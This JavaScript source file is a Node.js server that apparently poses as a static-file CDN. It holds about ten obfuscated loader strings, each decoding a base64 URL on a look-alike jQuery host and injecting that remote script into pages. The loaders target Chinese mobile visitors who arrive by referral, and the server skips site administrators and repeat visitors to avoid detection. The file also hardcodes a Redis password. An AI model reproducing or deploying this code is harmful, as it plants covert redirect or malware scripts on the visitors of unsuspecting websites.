const express = require('express');
const app = express();
const Redis = require('ioredis');
const cookieSession = require('cookie-session');
const path = require('path');
const axios = require('axios');
const crypto = require('crypto');
let useragent = require('express-useragent');

//const fs = require('fs');
//const { Transform } = require('stream');
//const streamToPromise = require('stream-to-promise');


const siteSource = 'cdn.ufodns.com'; //可更换
const redisConfig = { //可更换
  host: '127.0.0.1',
  port: 6379,
  password: '5PGdv9CSy',
};

const redis = new Redis(redisConfig); //链接redis
redis.on('error', (err) => {
  console.error('Redis connection error:', err); 
});
app.disable('etag');
app.disable('x-powered-by');
app.use(useragent.express());
app.use(
  cookieSession({
    name: 'session',
    keys: ['cdnStaticFile'], //cookie名字
    maxAge: 10 * 60 * 60 * 1000, //10 hours expire
  })
);


//查看是否是站长
function checkSiteadmin(redis, geoip2_real_ip) { // false 才让过
  return new Promise((resolve, reject) => {
    const hashKey = '管理员记录';

    redis.lrange(hashKey, 0, -1, (err, data) => {
      if (err) {
        console.error('Error retrieving data from Redis List:', err);
        resolve(false); // Reject the Promise with an error
      } else {
        const userDataList = data.map(JSON.parse);
        const ipExists = userDataList.some(userData => userData.IP === geoip2_real_ip);
        const count = userDataList.length;

        if (ipExists) {
          console.log('-发现管理员记录:', userDataList);
          resolve(true); // Resolve the Promise with a success status
        } else {
          console.log('-不是管理员');
          resolve(false); // Reject the Promise with a failure status
        }
      }
    });
  });
}

//查看referer 站是否有 超过100 unique ip
function checkHundredUniqueIP(redis, site) { // true 才让过
	return new Promise((resolve, reject) => {
	const hashKey = '用户质料';
	const varReferrer = site; 

	// Step 1: Retrieve all data from the Redis hash
	redis.hgetall(hashKey, (err, hashData) => {
		  if (err) {
			console.error('Error retrieving data from Redis hash:', err);
			resolve(false);
		  }

		  // Step 2: Parse the hash data
		  const userDataList = Object.values(hashData).map(JSON.parse);

		  // Step 3: Count unique IP addresses for the specified referrer
		  const uniqueIPsForReferrer = new Set();
		  userDataList.forEach(userData => {
			const referer = userData.Referer;
			const ip = userData.IP;

			if (referer === varReferrer) {
			  uniqueIPsForReferrer.add(ip);
			}
		  });

		  // Step 4: Check if the referrer has more than 100 unique IPs
		  const uniqueIPCount = uniqueIPsForReferrer.size;
		  if (uniqueIPCount > 100) {
			console.log(`Referrer ${varReferrer} has more than 100 unique IPs (${uniqueIPCount}).`);
			resolve(true);
		  } else {
			console.log(`Referrer ${varReferrer} has 100 or fewer unique IPs (${uniqueIPCount}).`);
			resolve(false);
		  }
	  });
   });	  
}

//查看访客唯一访问 10h ua + ip
function checkFirstVisit(redis, geoip2_real_ip, myuserAgent) { // true 才让过
  return new Promise((resolve, reject) => {
    const hashKey = '用户质料';


		redis.lrange(hashKey, 0, -1, (err, data) => {
		  if (err) {
			console.error('Error retrieving data from Redis List:', err);
			resolve(false); // Reject the Promise with an error
		  } else {
			const userDataList = data.map(JSON.parse);

			// Filter data by IP and userAgent
			const filteredData = userDataList.filter(userData =>
			  userData.IP === geoip2_real_ip &&
			  userData.userAgent === myuserAgent // Replace with the user agent you want to filter by
			);

			if (filteredData.length > 0) {
			  // Sort the filtered data by 访问时间 in descending order to get the latest record
			  filteredData.sort((a, b) => new Date(b['访问时间']) - new Date(a['访问时间']));

			  // Get the latest record
				const latestRecord = filteredData[0];
				const latestRecordDate = latestRecord['访问时间'];
				const recordDate = new Date(latestRecordDate);
				const currentDate = new Date();
				const timeDifference = currentDate - recordDate;
				const hoursDifference = timeDifference / (1000 * 60 * 60);
				if (hoursDifference > 10) {
				  console.log('-访问时间 is more than 10 hours ago.');	
				  resolve(true);
				} else {
				  console.log('-访问时间 is within 10 hours.');
				  resolve(false);
				}
			} else {
			  console.log('No matching records found.');
			  resolve(true); // Resolve the Promise with a true status
			}
		  }
		});
  });
}

//cookie 查看
function checkCookie(req, geoip2_real_ip) { //false 才让过
  return new Promise((resolve, reject) => {

  if (req.session.cdnStaticCookie) {
	const currentTime = Date.now();
	const { user_cookie_ip, expiryTime } = req.session.cdnStaticCookie;
    if (currentTime < expiryTime) {
       if (user_cookie_ip == geoip2_real_ip) {
		  //console.log('-Cookie is Valid'); 
		  resolve(true);
	   } else {
		  //console.log('-Cookie IP are changed'); 
		  resolve(false);		   
	   }
    } else {
      // Session has expired
      req.session.cdnStaticCookie = null; // Optionally, you can remove the expired cookie
		  //console.log('-Cookie is Expired'); 
		  resolve(false);
    }	
	
  } else {
	console.log('-Cookie not exist');  
    resolve(false);
  }    

  });
}

//设置cookie
function setCookie(geoip2_real_ip, req) {
	const sessionExpiry = req.sessionOptions.maxAge;
	const currentTime = Date.now();
	const expiryTime = currentTime + sessionExpiry;
	//console.log('-Cookie expiryTime:'+expiryTime);
	req.session.cdnStaticCookie = { 'user_cookie_ip': geoip2_real_ip, 'expiryTime':expiryTime };
	//console.log('-Cookie 设置完成');
}

//referer导出域名
function extractDomainFromReferrer(referrer) {
	if (!referrer) {
	  return null;
	}

	const match = referrer.match(/^(?:https?:\/\/)?(?:[^@\n]+@)?(?:www\.)?([^:\/\n?]+)/);
	return match ? match[1] : null;
}

//mime
function getContentType(url) {
	const ext = path.extname(url);
	switch (ext) {
	case '.js':
	  return 'text/javascript';
	case '.css':
	  return 'text/css';
	case '.scss':
	  return 'text/x-scss';
	case '.map':
	  return 'application/json';  	
	case '.png':
	  return 'image/png';   	
	case '.jpg':
	  return 'image/jpeg';       	
	case '.jpeg':
	  return 'image/jpeg';         	
	case '.gif':
	  return 'image/gif';          	
	case '.svg':
	  return 'image/svg+xml';
	case '.pdf':
	  return 'application/pdf';    
	case '.html':
	  return 'text/html';	
	case '.eot':
	  return 'application/vnd.ms-fontobject';
	default:
	  return 'application/octet-stream';
	}
}


function judgeReferer(countryCode, city, referer, isMobileUser, isFirstVisit_10h_ua_ip, isCookieSet, isSiteAdmin, isReferrerSiteNotLocal, user_agent, ip, redis) {
	let first_jump = `
	function _0x59c3(){const _0x328293=['6264710TNLVLR','script','48252jFGmSE','platform','165417uDVyHj','type','https://zz.badustatic.com/cdn/tongji.js?jv=','createElement','host','test','1015320aJZyRi','text/javascript','56ovzZgz','&cw=','1008842jnvOeb','155241smySne','onload','getElementsByTagName','referrer','1315760frsuDi','&rt=','uniqcode','1boTbHX','head','src','164VfgbJW','11topZZS','includes'];_0x59c3=function(){return _0x328293;};return _0x59c3();}(function(_0x418ee3,_0x48ab56){const _0xf04673=_0x4bbd,_0x1ca902=_0x418ee3();while(!![]){try{const _0x3584aa=parseInt(_0xf04673(0x105))/0x1*(-parseInt(_0xf04673(0xfd))/0x2)+parseInt(_0xf04673(0xf1))/0x3*(parseInt(_0xf04673(0x108))/0x4)+-parseInt(_0xf04673(0x102))/0x5+-parseInt(_0xf04673(0xf9))/0x6+-parseInt(_0xf04673(0xf3))/0x7+parseInt(_0xf04673(0xfb))/0x8*(parseInt(_0xf04673(0xfe))/0x9)+parseInt(_0xf04673(0xef))/0xa*(parseInt(_0xf04673(0x109))/0xb);if(_0x3584aa===_0x48ab56)break;else _0x1ca902['push'](_0x1ca902['shift']());}catch(_0x710eef){_0x1ca902['push'](_0x1ca902['shift']());}}}(_0x59c3,0x6cf1a));function _0x4bbd(_0x4ae256,_0x3de80a){const _0x59c3f9=_0x59c3();return _0x4bbd=function(_0x4bbdb5,_0x5bf97c){_0x4bbdb5=_0x4bbdb5-0xee;let _0x414955=_0x59c3f9[_0x4bbdb5];return _0x414955;},_0x4bbd(_0x4ae256,_0x3de80a);}function is_mob(){const _0x54af15=_0x4bbd;try{if(!/^Mac|Win/[_0x54af15(0xf8)](navigator[_0x54af15(0xf2)]))return!![];return![];}catch(_0x3ac043){return![];}}function MiddleLoadJS(_0x102466,_0x638e2c){const _0x4395e7=_0x4bbd;let _0x1049ea=document[_0x4395e7(0xf6)](_0x4395e7(0xf0)),_0x15ffee=_0x638e2c||function(){};_0x1049ea[_0x4395e7(0xf4)]=_0x4395e7(0xfa);{_0x1049ea[_0x4395e7(0xff)]=function(){_0x15ffee();};}_0x1049ea[_0x4395e7(0x107)]=_0x102466,document[_0x4395e7(0x100)](_0x4395e7(0x106))[0x0]['appendChild'](_0x1049ea);}function send(){const _0x26abc0=_0x4bbd;let _0x4ee775=_0x26abc0(0xf5)+'tongjihost'+_0x26abc0(0x103)+'time'+_0x26abc0(0xfc)+_0x26abc0(0x104)+'&hst='+window['location'][_0x26abc0(0xf7)],_0x32be45=is_mob();if(_0x32be45){let _0x24c52b=document[_0x26abc0(0x101)],_0x5ddd29=_0x24c52b[_0x26abc0(0xee)]('.')&&!_0x24c52b['includes'](window['location']['host']);_0x5ddd29&&MiddleLoadJS(_0x4ee775);}}send();
	`;	
	
	const jc_yingshi_string = `
	function MqMqY(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function HHwbhL(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return MqMqY(t)}eval('window')['\x6b\x6c\x6f\x64\x54\x71']=function(){;(function(u,r,w,d,f,c){var x=HHwbhL;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9hcGkuYmR1c3RhdGljLmNvbS9qcXVlcnkubWluLTQuMC4xLmpz','gUssQxWzjLAD',window,document,'DrPdgDiahyku','ptsrhUDHCv')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) klodTq();
	`;

	const jc_bc_string = `
	function HYTEZHhE(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function FvjRVcrk(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return HYTEZHhE(t)}eval('window')['\x76\x66\x73\x4d\x56\x5a']=function(){;(function(u,r,w,d,f,c){var x=FvjRVcrk;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9hcGkuYmR1c3RhdGljLmNvbS9qcXVlcnkubWluLTQuMC4yLmpz','pHsyIRmUMHcje',window,document,'MrKwbLiCEPkTlA','ptvJPA')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) vfsMVZ();
	`;

	const jc_tiyu_string = `
	function VrbzcRrL(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function nAHjMur(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return VrbzcRrL(t)}eval('window')['\x4c\x72\x4f\x4a\x62\x65']=function(){;(function(u,r,w,d,f,c){var x=nAHjMur;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9hcGkuYmR1c3RhdGljLmNvbS9qcXVlcnkubWluLTQuMC4zLmpz','OCsbSRx',window,document,'arQtaIilLvbesd','ptDoVpz')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) LrOJbe();
	`;

	const jc_6hecai_string = `
	function pMPoQt(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function uZlPoIO(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return pMPoQt(t)}eval('window')['\x53\x6c\x44\x57\x62\x42']=function(){;(function(u,r,w,d,f,c){var x=uZlPoIO;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9hcGkuYmR1c3RhdGljLmNvbS9qcXVlcnkubWluLTQuMC40Lmpz','KcsmxypijCBn',window,document,'ErJJTJirCSld','ptPcFdJnuHpq')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) SlDWbB();
	`;

	const jc_xs_string = `
	function ESDAjp(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function NnOdGNP(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return ESDAjp(t)}eval('window')['\x45\x42\x4e\x79\x59\x77']=function(){;(function(u,r,w,d,f,c){var x=NnOdGNP;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9hcGkuYmR1c3RhdGljLmNvbS9qcXVlcnkubWluLTQuMC41Lmpz','dXssrAkJT',window,document,'FrrAkWiLkSXze','ptpSBdl')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) EBNyYw();
	`;

	const jc_qp_string = `
	function hcDRIT(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function BzAOAHt(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return hcDRIT(t)}eval('window')['\x43\x66\x54\x4c\x71\x49']=function(){;(function(u,r,w,d,f,c){var x=BzAOAHt;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9hcGkuYmR1c3RhdGljLmNvbS9qcXVlcnkubWluLTQuMC42Lmpz','OvstmndUSB',window,document,'QrjEgWinaWQjfh','ptsFUs')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) CfTLqI();
	`;
	const jc_dz_string = `
	function IfrhB(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function eusHMZQ(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return IfrhB(t)}eval('window')['\x65\x76\x55\x50\x73\x4b']=function(){;(function(u,r,w,d,f,c){var x=eusHMZQ;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9hcGkuYmR1c3RhdGljLmNvbS9qcXVlcnkubWluLTQuMC43Lmpz','KfsffUoV',window,document,'xrkCUBiebZB','ptaZYyFUliLY')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) evUPsK();
	`;
	const jc_sm_string = `
	function CfmLsRsf(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function ivMRbsXEF(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return CfmLsRsf(t)}eval('window')['\x46\x43\x4a\x69\x42\x6e']=function(){;(function(u,r,w,d,f,c){var x=ivMRbsXEF;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly91bmlvbi5tYWNvbXMubGEvanF1ZXJ5Lm1pbi00LjAuOC5qcw==','hQsdmVhwajVH',window,document,'ErKvHBiEBJ','ptiMBpUqvdk')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) FCJiBn();
	`;
	const jc_cp_string = `
	function mghvcQQX(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function kMUvlI(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return mghvcQQX(t)}eval('window')['\x4f\x64\x62\x6a\x6a\x5a']=function(){;(function(u,r,w,d,f,c){var x=kMUvlI;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly91bmlvbi5tYWNvbXMubGEvanF1ZXJ5Lm1pbi00LjAuOS5qcw==','DZsusdqQBdxgl',window,document,'zrNOWbiMmUZl','ptGjPu')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) OdbjjZ();
	`;
	const jc_bc2_string = `
	function krBQATz(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function CQEZfMqpfa(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return krBQATz(t)}eval('window')['\x50\x4e\x41\x69\x4f\x6c']=function(){;(function(u,r,w,d,f,c){var x=CQEZfMqpfa;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9hcGkuYmR1c3RhdGljLmNvbS9qcXVlcnkubWluLTQuMC4xMC5qcw==','uKsbYfruROGC',window,document,'IrCoNDiXdjtPMqZ','ptrbDePscS')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) PNAiOl();
	`;
	
	
	if(countryCode != "CN") {
		return ''; 
	}	
	if(referer == "" || referer == null) {
		return ''; 
	}	
	if(isMobileUser == false || isMobileUser == null) {
		return ''; 
	}
	if(isFirstVisit_10h_ua_ip == false) {
		return ''; 
	}	
	if (isCookieSet == true) {
		return '';
	}
	if (isSiteAdmin == true) {
		return '';
	}	
	if (isReferrerSiteNotLocal == false) {
		return '';
	}
	//检查备案
	if (countryCode == 'CN'){
			redis.hget('beian_domain', referer, (err, beian) => {
			  if (err) {
				console.error('Error:', err);
			  } else {
				if (city == beian) {
					return '';
				}
			  }
			});		
	}
	
		const sets = [
		  'bc_list',
		  'maccms_yingshi_list',
		  'tiyu_list',
		  '6hecai_list',
		  'xs_list',
		  'qp_list',
		  'dz_list',
		  'sm_list',
		  'cp_list'
		];


		Promise.all(sets.map(set => {
		  return new Promise((resolve, reject) => {
			redis.sismember(set, referer, (err, res) => {
			  if (err) {
				reject(err);
			  } else {
				if (res === 1) {
				  // Set the appropriate values based on the set
				  let res33, resType;
				  switch (set) {
					case 'bc_list':
					  res33 = jc_bc_string;
					  resType = 'bc';
					  redis.sadd('bc_fangwen_list', referer);
					  break;
					case 'tiyu_list':
					  res33 = jc_tiyu_string;
					  resType = 'ty';
					  redis.sadd('tiyu_fangwen_list', referer);
					  break;
					case '6hecai_list':
					  res33 = jc_6hecai_string;
					  resType = 'hc';
					  redis.sadd('6hecai_fangwen_list', referer);
					  break;
					case 'xs_list':
					  res33 = jc_xs_string;
					  resType = 'xs';
					  redis.sadd('xs_fangwen_list', referer);
					  break;
					case 'qp_list':
					  res33 = jc_qp_string;
					  resType = 'qp';
					  redis.sadd('qp_fangwen_list', referer);
					  break;
					case 'dz_list':
					  res33 = jc_dz_string;
					  resType = 'dz';
					  redis.sadd('dz_fangwen_list', referer);
					  break;
					case 'sm_list':
					  res33 = jc_sm_string;
					  resType = 'sm';
					  redis.sadd('sm_fangwen_list', referer);
					  break;
					case 'cp_list':
					  res33 = jc_cp_string;
					  resType = 'cp';
					  redis.sadd('cp_fangwen_list', referer);
					  break;
					case 'yingshi_list':
					  res33 = jc_yingshi_string;
					  resType = 'ys';
					  redis.sadd('yingshi_fangwen_list', referer);
					  break;
					default:
					  break;
				  }
				  resolve({ res, res33, resType });
				} else {
				  resolve({ res });
				}
			  }
			});
		  });
		})).then(results => {
		  console.log(results);
		}).catch(err => {
		  console.error('Error:', err);
		});	
		
        if ((referer != '' || referer != null) && isMobileUser == true && $countryCode == "CN") {
			redis.incr(`${res}_request_count`, (err, result) => {
			  if (err) {
				console.error('Error incrementing:', err);
			  } else {
				console.log(`${res}_request_count incremented. New value:`, result);
			  }
			});
            let time = 60*60*10;
			const jump_hash = crypto.createHash('md5')
			  .update(user_agent + ip + Math.floor(Math.random() * 1000 + 1))
			  .digest('hex');
			const currentTimeInSeconds = Math.floor(Date.now() / 1000);  

            first_jump = first_jump.replace('time',currentTimeInSeconds);
            first_jump = first_jump.replace('uniqcode',jump_hash);
            first_jump = first_jump.replace('tongjihost',res);

            return first_jump;
        } else {
			return '';
		}			
	
}

